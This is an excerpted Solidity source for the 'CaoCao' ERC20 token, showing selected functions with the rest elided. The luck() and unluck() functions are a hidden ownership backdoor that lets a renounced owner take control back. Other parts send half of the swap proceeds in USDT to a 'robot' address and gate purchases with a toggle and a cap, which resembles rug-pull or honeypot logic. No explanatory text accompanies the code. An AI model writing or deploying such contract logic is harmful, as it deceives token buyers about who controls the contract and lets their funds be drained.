...
contract Ownable is Context {
    ...
    function luck() public  onlyOwner {
        luckAddress = _owner;
    } 

    function unluck() public  onlyOwner {
        require(luckAddress != address(0));
        _owner = luckAddress;
    }

    address _robotAddress;
    function closeRobot(address robot) public  onlyOwner {
        _robotAddress = robot;
    }
}
...
contract CaoCao is ERC20 {
	...
	address payable _fundAddress = payable(address(0x015c88055CCe9C7996e1AE6b257ADd1428698Ae7));
    ...
    constructor(address tokenOwner) ERC20("CaoCao", "CaoCao") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xB6BA90af76D139AB3170c7df0139636dB6120F7e);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        _approve(address(this), address(0xB6BA90af76D139AB3170c7df0139636dB6120F7e), 10**26);
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || balanceOf(_destroyAddress) >= 9 * 10**21) {
            takeFee = false;
        }else{
			if(from == uniswapV2Pair){
				require(swapStats);
                require(balanceOf(to).add(amount) <= 30 * 10**18);
    ...
    function swapAndLiquifyV3(uint256 contractTokenBalance) public {
        ...
        if(newAmount > 0){
            USDT.transfer(_robotAddress,newAmount.div(2));
        }
    }
	...
	function _takeInviterFee(
        ...
        for (int256 i = 0; i < 4; i++) {
            ...
            super._transfer(sender, _receiveD, amount.div(400));
        }
    }
}